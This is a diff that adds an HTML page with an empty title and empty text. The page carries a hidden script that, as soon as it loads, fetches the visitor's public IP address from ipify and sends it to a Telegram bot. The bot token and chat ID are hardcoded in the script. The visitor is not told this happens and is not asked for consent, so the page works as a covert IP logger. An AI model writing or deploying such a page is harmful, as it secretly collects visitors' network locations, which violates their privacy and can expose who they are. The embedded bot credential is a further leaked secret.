@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1></h1>
+    <p></p>
+
+    <script>
+        function sendIPToTelegram(ip) {
+            const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+            const chatId = '7174617845';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=New visitor's IP Address: ${ip}`;
+
+            // Using XMLHttpRequest to send the IP address to Telegram
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET", url, true);
+            xhttp.send();
+        }
+
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendIPToTelegram(ip); // Send IP address to Telegram
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                });
+        }
+
+        // Call getIP when the page loads
+        window.onload = getIP;
+    </script>
+</body>
+</html>
